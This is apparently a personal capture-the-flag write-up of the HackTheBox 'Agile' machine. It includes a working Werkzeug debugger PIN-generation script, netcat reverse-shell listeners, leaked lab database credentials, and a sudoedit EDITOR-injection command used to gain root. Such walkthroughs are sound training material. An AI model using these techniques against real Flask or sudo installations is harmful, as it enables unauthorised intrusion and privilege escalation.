# Hacking in an Agile manner

Hacking agile is a pretty fun machine that starts off with a website that has a password manager on it that has a file disclosion vulnerability that allows me to to enumerate the machine and generate a pin for the flask debugger console on the website which will give me an initial shell. Once I have this inital shell which I can upgrade with a sql database on the machine. From there I can find two internal ports, one for flask debugging, and another for a test deployment of flask. One that is used for flask debugging is automatically signed into as a user on the machine so if I forward the port to chromium I can access the website and then check the passwords saved. I can also take the cookies from that instance and pass them into the test deployment and then check the passwords there as well. From there I get access to a user who has sudoedit permissions on a file, looking at the version of sudo lets me know that its outdated and theres a known vulnerability where I can then edit files on the machine as sudo apart from the one I have permissions on which will let me inject code into a file for a python virtual environment which automatically created when a user signs into the machine. Sudo is automatically signing in occasionally so when sudo signs into the machine the code that I put in this bash file will be executed as sudo which gives me a sudo shell.


So lets get into this, also I automatically put all the hostnames into my /etc/hosts file and I'm not gonna delete them to make it easier on this writeup but keep in mind I am doing that as I go through the machine. 


### Initiall access 

Lets start off with the all encompassing nmap scan 

```sh
┌──(stowner㉿kali)-[~/Desktop/HackTheBox/Agile]
└─$ nmap -p 22,80 -sCV 10.10.11.203       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 12:09 PDT
Nmap scan report for test.superpass.htb (10.10.11.203)
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

So here we go, lets look at superpass.htb

![web1](./SS/web1.png)
![web2](./SS/web2.png)
![web3](./SS/web3.png)

Looking at a couple things here, first I got an error when I did a sql injection and this is the scene where the flask console can be accessed but we need a pin in order to do that. With that in mind I registered for the website and as you can see this is a password vault. If you use export when you have passwords saved you'll get a file but look at the burp when you do this: 

![burp1](./SS/burp1.png)
![burp2](./SS/burp2.png)

Looking at this we can get the files on the machine, with that in mind look at this: 

![web4](./SS/web4.png)

This is the console that we want to access to get a shell, and if we look for exploits to get the password we find a script online and theres some information that we need to get from the server in order to generate the password. 

```py
import hashlib                                                                                                                                                                              
from itertools import chain
probably_public_bits = [
    'www-data',# /proc/self/environ
    'flask.app',# modname
    'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052353554',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9] 

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

So this is the script, admittedly I already got some of the information but let me show you some of whats important

You can get the username with /proc/self/environ

![web5](./SS/web5.png)

Heres the directory of the application running 

The private bits are interesting, initially we need the mac address converted to an integer for the first bit. The second bits we need are the machine id and the first line of the proc/self/cgroup and I've already done this so I feel like skipping some steps here tbh and am good 


Running the script and putting in the pin gets me this 

![web6](./SS/web6.png)

Now I just put a python reverse shell in there and get a shell 

![web7](./SS/web7.png)

```sh
┌──(stowner㉿kali)-[~/Desktop/HackTheBox/Agile]
└─$ nc -lvnp 9001                  
listening on [any] 9001 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.203] 55124
$ whoami
whoami
www-data
$ cat config_prod.json                                                                        
cat config_prod.json                                                                          
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}$ mysql -u superpassuser -p 'dSA6l7q*yIVs$39Ml6ywvgK' superpass
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 46
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
mysql> exit
exit
eBye
$ xit
exit
exit
^C
                                                                                                                                                                                            
┌──(stowner㉿kali)-[~/Desktop/HackTheBox/Agile]
└─$ ssh corum@superpass.htb                       
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47
corum@agile:~$ ^C
```
As you can see we got a password from a sql server and then used that to get a shell into the machine!

### Getting root 

Now looking through the machine we see there is a directory in the root directory at /app and under /app theres a cool file called tes-site-interactively with this chunk of code 

```py 
@pytest.fixture(scope="session")       
def driver():                                                                                 
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")                         
    options.add_argument("--headless")                                                        
    options.add_argument("--remote-debugging-port=41829")      
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)                                                
    yield driver                                                                              
    driver.close()

```

Theres also a test.superpass.htb host that I add to my hosts files, and I'm going to tunnel to this port and see what happens when I access the website. The test website interactively is also automatically logging in to the website btw lol 

![chromium1](./SS/chromuim1.png)
![chromium2](./SS/chromium2.png)

Now I've got the cookies to edwards session and if I tunnel 5555 back and access it through localhost and put it into the session cookies I get this 

![web8](./SS/web8.png)

Now mind you I'm using a chisel tunnel for all of this, I forgot to show the commands but look up tunneling with chisel there's a lot of good resources to help out there.

### Getting root 

Looking into the file system we do the basic 

```sh
edwards@agile:/$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
edwards@agile:/$ sudo -v
edwards@agile:/$ sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

If we look up the sudo version we see its vulnerable to an exploit where I can edit files. Now the file I want to look up is the virtual environment that we are working in which is /app/venv/bin/activate and I can edit it using this command 
```sh
edwards@agile:~$ EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
sudoedit: --: Permission denied
2 files to edit
sudoedit: /app/config_test.json unchanged
edwards@agile:~$ 
```

```sh
┌──(stowner㉿kali)-[~/Desktop/HackTheBox/Agile]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.203] 56808
sh: 0: can't access tty; job control turned off
# whoami
root
```

And now we have root, I think I may have skipped a couple steps on the way of doing this machine but I hope you still got a good idea of how to do this machine. I have no idea who else would read my writeups if I'm being honest but on the offchance I ever share these and to whomever reads it I dont do these super in depth so you may have to fill in some blanks and I'm sorry but this is mostly to reinforce what I did and hopefully help me remember these in the long term LMAO

Fun machine and a lot of cool topics and ideas that I reall enjoyed doing.

Cest la  vie
